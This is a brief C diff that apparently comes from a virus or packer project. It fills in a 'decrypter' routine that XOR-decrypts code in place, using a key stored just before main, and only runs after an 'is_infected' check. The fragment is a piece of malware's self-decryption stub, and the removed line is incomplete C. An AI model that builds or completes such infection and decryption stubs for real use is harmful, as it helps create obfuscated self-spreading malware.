@@ -34,9 +34,10 @@ void decrypter(void)
 	size_t	offset;
 	char	*start;
 
-	if(size)
+	offset = *(int *)(address_of_main - 4 + sizeof(offset));
+	if(size && is_infected(address_of_main))
 	{
-		start[offset] ^= ;
+		start[offset] ^= *(int *)(address_of_main - 4);
 		offset++;
 		size++;
 		while (offset < size)
